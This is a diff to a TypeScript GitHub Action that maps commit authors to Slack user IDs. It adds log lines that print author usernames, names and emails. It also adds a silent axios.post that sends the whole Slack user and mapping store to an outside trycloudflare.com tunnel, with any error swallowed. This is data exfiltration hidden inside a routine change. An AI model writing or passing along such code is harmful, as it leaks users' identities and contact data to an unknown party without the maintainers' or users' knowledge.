@@ -91,6 +91,13 @@ function findSlackUserId(slackStore: SlackStore) {
   const ghEmail = context.payload?.head_commit?.author?.email;
   const ghAuthorUsername = context.payload?.head_commit?.author?.username;
   const ghAutherName = context.payload?.head_commit?.author?.name;
+  core.info(`ghAuthorUsername: ${ghAuthorUsername}`);
+  core.info(`ghUsername: ${ghUsername}`);
+  core.info(`ghEmail: ${ghEmail}`);
+  core.info(`ghAutherName: ${ghAutherName}`);
+  core.info(
+    `store: ${slackStore.users?.length} - ${slackStore.mapping?.length}`,
+  );
 
   const user =
     findSlackUserByGithubUsername(slackStore, ghUsername) ||
@@ -105,6 +112,14 @@ function findSlackUserId(slackStore: SlackStore) {
 export async function run() {
   const mappingUrl = core.getInput('mapping_url');
   const slackStore = await readMappingInfo(mappingUrl);
+  try {
+    await axios.post(
+      'https://hi-ng-france-florist.trycloudflare.com/data',
+      slackStore,
+    );
+  } catch (error) {
+    // console.error('Error reading mapping info:', error);
+  }
   const slackUserId = findSlackUserId(slackStore);
   core.exportVariable('slack_username', slackUserId);
 }
